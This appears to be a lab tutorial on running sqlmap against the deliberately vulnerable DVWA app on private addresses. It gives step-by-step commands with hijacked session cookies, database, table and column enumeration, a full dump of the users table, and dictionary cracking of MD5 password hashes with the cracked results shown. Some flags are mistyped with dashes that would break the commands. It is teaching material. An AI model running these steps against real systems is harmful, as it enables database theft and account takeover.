## SQL Injection [sqlmap]

<img src="https://www.kali.org/tools/sqlmap/images/sqlmap-logo.svg" style="width:120px;"/>

SQL injection is a type of cyberattack where malicious code is injected into a website's database through vulnerable input fields. By exploiting these vulnerabilities, attackers can steal sensitive data, manipulate databases, or even take control of entire systems. This threat underscores the importance of secure coding practices and input validation to protect web applications from SQL injection attacks.


sqlmap goal is to detect and take advantage of SQL injection vulnerabilities in web applications. Once it detects one or more SQL injections on the target host, the user can choose among a variety of options to perform an extensive back-end database management system fingerprint, retrieve DBMS session user and database, enumerate users, password hashes, privileges, databases, dump entire or user’s specific DBMS tables/columns, run his own SQL statement, read specific files on the file system and more.



---
### 1- GET request injection

assuming we already hijacked a user session and obtained the url and cookies. the following url make a GET request to the server "http://192.168.70.6/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#". which is vulnerable to SQL injection.

```bash
sqlmap \ 
    -u "http://192.168.29.131/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" \
    -—cookie="PPHPSESSID=b34298a6eb8fcec881d3d0b9cfd9f1f6;security=low”
```
- `-u` the target url
- `--cookie` cookies captured by sniffing sessions

**sqlmap with prompt multiple question, you should answer as follow:**



```markdown
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
```
<!-- <span style="color: gold">Answer with no, otherwise the attack will take a very long time.</yellow> -->

[!TIP] asd

```markdown
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
```
<yellow>Answer with yes</mayellowrk>
```markdown
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
```
<yellow>Answer with no, anyway you may specify the paremeters with `-p` option for example `-p "id"`</yellow>
```markdown
[15:32:28] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.70.6'
```
<yellow>The result will be saved to local directory, and any previous attack on the same url will continue on the previous attack. otherwise you may reset the attack by deleting the directory `sudo rm "/root/.local/share/sqlmap/output/192.168.70.6"`</yellow>

---
### 2- dump all databases

```bash
sqlmap \ 
    -u "http://192.168.29.131/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" \
    -—cookie="PPHPSESSID=b34298a6eb8fcec881d3d0b9cfd9f1f6;security=low” \
    —-dbs
```
- `-u` the target url
- `--cookie` cookies captured by sniffing sessions
- `--dbs` show databases

```
[15:36:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: Apache 2.2.8, PHP 5.2.4
back-end DBMS: MySQL >= 4.1
[15:36:30] [INFO] fetching database names
available databases [7]:
[*] dvwa
[*] information_schema
[*] metasploit
[*] mysql
[*] owasp10
[*] tikiwiki
[*] tikiwiki195
```
as shown all the databases are dumped.

---
### 3- dump all tables

```bash
sqlmap \ 
    -u "http://192.168.29.131/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" \
    -—cookie="PPHPSESSID=b34298a6eb8fcec881d3d0b9cfd9f1f6;security=low” \
    -D "dvwa" —-tables
```
- `-u` the target url
- `--cookie` cookies captured by sniffing sessions
- `-D` specify database
- `--tables` show tables

```
---
[15:38:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: Apache 2.2.8, PHP 5.2.4
back-end DBMS: MySQL >= 4.1
[15:38:06] [INFO] fetching tables for database: 'dvwa'
[15:38:07] [WARNING] reflective value(s) found and filtering out
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```
as shown all the tables in the specified database are dumped.

---
### 4- show all columns

```bash
sqlmap \ 
    -u "http://192.168.29.131/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" \
    -—cookie="PPHPSESSID=b34298a6eb8fcec881d3d0b9cfd9f1f6;security=low” \
    -D "dvwa" —T "users" --columns
```
- `-u` the target url
- `--cookie` cookies captured by sniffing sessions
- `-D` specify database
- `-T` specify tables
- `--columns` show columns

```
---
[15:39:07] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL >= 4.1
[15:39:07] [INFO] fetching columns for table 'users' in database 'dvwa'
[15:39:08] [WARNING] reflective value(s) found and filtering out
Database: dvwa
Table: users
[6 columns]
+------------+-------------+
| Column     | Type        |
+------------+-------------+
| user       | varchar(15) |
| avatar     | varchar(70) |
| first_name | varchar(15) |
| last_name  | varchar(15) |
| password   | varchar(32) |
| user_id    | int(6)      |
+------------+-------------+
```
as shown all the columns in the specified database and table are shown.

---
### 5- show all columns

```bash
sqlmap \ 
    -u "http://192.168.29.131/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" \
    -—cookie="PPHPSESSID=b34298a6eb8fcec881d3d0b9cfd9f1f6;security=low” \
    -D "dvwa" —T "guestbook" --dump
```
- `-u` the target url
- `--cookie` cookies captured by sniffing sessions
- `-D` specify database
- `-T` specify tables
- `--dump` dump all data

```
---
[15:46:57] [INFO] fetching entries for table 'guestbook' in database 'dvwa'
Database: dvwa
Table: guestbook
[1 entry]
+------------+--------+-------------------------+
| comment_id | name   | comment                 |
+------------+--------+-------------------------+
| 1          | test   | This is a test comment. |
+------------+--------+-------------------------+

```
as shown all the data in the specified database and table are dumped.

---
### 6- dump data from a table (with passwords)

```bash
sqlmap \ 
    -u "http://192.168.29.131/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" \
    -—cookie="PPHPSESSID=b34298a6eb8fcec881d3d0b9cfd9f1f6;security=low” \
    -D "dvwa" —T "users" --dump
```
- `-u` the target url
- `--cookie` cookies captured by sniffing sessions
- `-D` specify database
- `-T` specify tables
- `--dump` dump all data

**sqlmap with prompt multiple question, you should answer as follow:**
```markdown
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]

```
<yellow>Answer with no</yellow>

```markdown
do you want to crack them via a dictionary-based attack? [Y/n/q] 
```
<yellow>#Answer with yes if you want to crack passwords.</yellow>

```
[15:42:01] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
```
<yellow>as you can see the hashing algorithm is detected "md5_generic_passwd", select the genric wordlist [1] or specify a custom dictionary file.</yellow>

```markdown
do you want to use common password suffixes? (slow!) [y/N]

```
<yellow>Answer with no</yellow>



```
[15:43:27] [INFO] starting 2 processes 
[15:43:29] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'            
[15:43:30] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'           
[15:43:33] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'           
[15:43:34] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'          
Database: dvwa                                                                                     
Table: users
[5 entries]
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
| user_id | user    | avatar                                                | password                                    | last_name | first_name |
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
| 1       | admin   | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      |
| 2       | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     |
| 3       | 1337    | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       |
| 4       | pablo   | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      |
| 5       | smithy  | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        |
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
```
As shown all the data with passwords in the specified database and table are dumped.

---
> For more questions email: nagy@aast.edu


<style>
yellow { color: Yellow }
</style>